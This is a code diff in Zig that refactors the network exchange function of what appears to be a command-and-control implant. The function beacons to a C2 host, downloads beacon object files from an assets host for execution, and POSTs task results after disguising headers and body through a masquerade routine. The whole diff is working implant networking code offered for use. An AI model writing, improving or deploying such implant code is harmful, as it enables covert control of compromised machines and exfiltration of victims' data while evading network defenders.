@@ -181,115 +181,83 @@ fn netHttpExchange(
     var bof_res: ?*BofRes = null;
     var masked_body_len: u32 = 0;
 
-    //prepare request options
-    const server_header_buffer = s.allocator.alloc(u8, 16 * 1024) catch return null;
-    defer s.allocator.free(server_header_buffer);
-
-    const http_reqOptions = s.allocator.create(std.http.Client.RequestOptions) catch return null;
-    http_reqOptions.* = .{
-        //.server_header_buffer = server_header_buffer,
+    var http_reqOptions: std.http.Client.RequestOptions = .{
         .keep_alive = true,
+        .connection = conn,
     };
-    defer s.allocator.destroy(http_reqOptions);
 
-    if (connectionType == netConnectionType.Heartbeat) {
-        http_method = std.http.Method.GET;
-        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
-        //defer s.allocator.free(url);
-        uri = std.Uri.parse(url) catch return null;
+    if (connectionType == .Heartbeat) {
+        http_method = .GET;
+        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
+        uri = try std.Uri.parse(url);
 
         // apply HTTP header transforms
-        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
-    } else if (connectionType == netConnectionType.ResourceFetch and extra_data != null) {
+        _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
+    } else if (connectionType == .ResourceFetch and extra_data != null) {
         // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
         const bof_path: []const u8 = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(extra_data)), 0);
 
         std.log.info("in netExchange: ResurceFetch {s}", .{bof_path});
 
-        http_method = std.http.Method.GET;
-        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path }) catch unreachable;
-        //defer s.allocator.free(url);
-        uri = std.Uri.parse(url) catch return null;
+        http_method = .GET;
+        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.assets_host, bof_path });
+        uri = try std.Uri.parse(url);
 
         // apply HTTP header transforms
-        _ = s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, null, len);
-    } else if (connectionType == netConnectionType.TaskResult and extra_data != null) {
+        _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
+    } else if (connectionType == .TaskResult and extra_data != null) {
         // in case of TaskResult exchange extra_data is a length len.*
 
         bof_res = @as(*BofRes, @ptrCast(@alignCast(extra_data)));
 
         http_method = std.http.Method.POST;
-        const url = std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint }) catch return null;
-        //defer s.allocator.free(url);
-        uri = std.Uri.parse(url) catch return null;
+        const url = try std.fmt.allocPrint(s.allocator, "http://{s}{s}", .{ s.c2_host, s.c2_endpoint });
+        uri = try std.Uri.parse(url);
 
         // apply HTTP header transforms and
         // mask body data according to transforms implemented in netMasquerade(...) and assign it to 'body_data' which will be sent
         masked_body_len = 0;
-        const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(s, connectionType, http_reqOptions, bof_res, &masked_body_len));
+        const masked_body: ?[*]u8 = @ptrCast(s.implant_actions.netMasquerade(
+            s,
+            connectionType,
+            &http_reqOptions,
+            bof_res,
+            &masked_body_len,
+        ));
         if (masked_body) |body| {
             body_data = @as([*]u8, @ptrCast(@constCast(body)))[0..masked_body_len];
         }
     }
 
     // create HTTP request
-    //var server_header: std.heap.FixedBufferAllocator = .init(server_header_buffer);
-    const http_request = s.allocator.create(std.http.Client.Request) catch return null;
-    http_request.* = .{
-        .uri = uri,
-        .client = http_client,
-        .connection = conn,
-        .keep_alive = http_reqOptions.keep_alive,
-        .method = http_method,
-        .version = http_reqOptions.version,
-        .transfer_encoding = .none,
-        .redirect_behavior = http_reqOptions.redirect_behavior,
-        .handle_continue = http_reqOptions.handle_continue,
-        //.response = .{
-        //    .version = undefined,
-        //    .status = undefined,
-        //    .reason = undefined,
-        //    .keep_alive = undefined,
-        //    .parser = .init(server_header.buffer[server_header.end_index..]),
-        //},
-        .headers = http_reqOptions.headers,
-        .extra_headers = http_reqOptions.extra_headers,
-        .privileged_headers = http_reqOptions.privileged_headers,
-    };
-    defer s.allocator.destroy(http_request);
+    var http_request = try http_client.request(http_method, uri, http_reqOptions);
+    defer http_request.deinit();
 
-    if (connectionType == netConnectionType.TaskResult and body_data != null)
-        http_request.transfer_encoding = .{ .content_length = masked_body_len };
-
-    // sends HTTP header
-    http_request.send() catch unreachable;
-
-    // sends HTTP body
-    if (connectionType == netConnectionType.TaskResult and body_data != null) {
+    if (connectionType == .TaskResult and body_data != null) {
+        // sends HTTP body and header
         http_request.transfer_encoding = .{ .content_length = body_data.?.len };
-        http_request.writeAll(body_data.?) catch unreachable;
-        http_request.finish() catch unreachable;
+        try http_request.sendBodyComplete(body_data.?);
+    } else {
+        // sends HTTP header
+        try http_request.sendBodiless();
     }
 
-    // get the for response
-    // TODO make sure that HTTP 200 was returned
-    http_request.wait() catch return null;
-    //if (http_request.response.status != .ok) {
-    //    return error.BadData;
-    //}
+    var response = try http_request.receiveHead(&.{});
+    if (response.head.status != .ok) {
+        return error.BadData;
+    }
 
-    const body_resp_content = s.allocator.alloc(u8, @intCast(http_request.response.content_length.?)) catch return null;
-    errdefer s.allocator.free(body_resp_content);
+    const response_content = try s.allocator.alloc(u8, @intCast(response.head.content_length.?));
+    errdefer s.allocator.free(response_content);
 
-    _ = http_request.readAll(body_resp_content) catch return null;
-    len.* = @intCast(body_resp_content.len);
+    const response_reader = response.reader(response_content);
+    try response_reader.readSliceAll(response_content);
 
-    // TODO: free in case of error
-    http_request.deinit();
+    if (connectionType != .TaskResult) {
+        return response_content;
+    }
 
-    if (connectionType != netConnectionType.TaskResult) {
-        return body_resp_content;
-    } else return null;
+    return null;
 }
 
 fn netMasquerade(state: *anyopaque, connectionType: netConnectionType, hdr_to_mask: *anyopaque, data_to_mask: ?*anyopaque, len: *u32) callconv(.c) ?*anyopaque {
